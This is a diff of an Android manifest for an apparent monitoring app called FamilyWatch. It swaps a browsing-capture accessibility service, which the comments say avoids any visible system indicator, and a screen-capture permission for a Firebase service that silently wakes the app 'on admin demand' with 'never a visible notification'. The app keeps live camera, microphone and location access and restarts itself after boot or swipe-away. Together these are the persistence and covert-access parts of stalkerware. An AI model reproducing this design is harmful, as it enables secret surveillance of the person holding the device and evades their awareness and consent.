@@ -39,25 +39,9 @@
         <!-- Background keep-alive service -->
         <service
             android:name=".KeepAliveService"
-            android:foregroundServiceType="dataSync|camera|microphone|location|mediaProjection"
+            android:foregroundServiceType="dataSync|camera|microphone|location"
             android:exported="false"
             android:stopWithTask="false" />
-
-        <!-- Reads Chrome's address bar only, to capture browsing activity — no persistent
-             system indicator (unlike the VPN approach this replaces). Granted via a special
-             Settings screen, not a manifest <uses-permission>. -->
-        <service
-            android:name=".BrowserActivityAccessibilityService"
-            android:label="Browsing activity monitor"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
 
         <!-- Restart service on device boot and after app swipe-away -->
         <receiver
@@ -69,6 +53,16 @@
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
+
+        <!-- Wakes KeepAliveService on admin demand even if the app was fully killed —
+             see FamilyWatchMessagingService. Data-only pushes, never a visible notification. -->
+        <service
+            android:name=".FamilyWatchMessagingService"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
 
     </application>
 
@@ -100,9 +94,6 @@
     <!-- Exact alarms — needed to restart service reliably on Android 12+ -->
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
-
-    <!-- Screen capture -->
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
     <!-- Live monitor: camera, microphone, GPS location -->
     <uses-permission android:name="android.permission.CAMERA" />
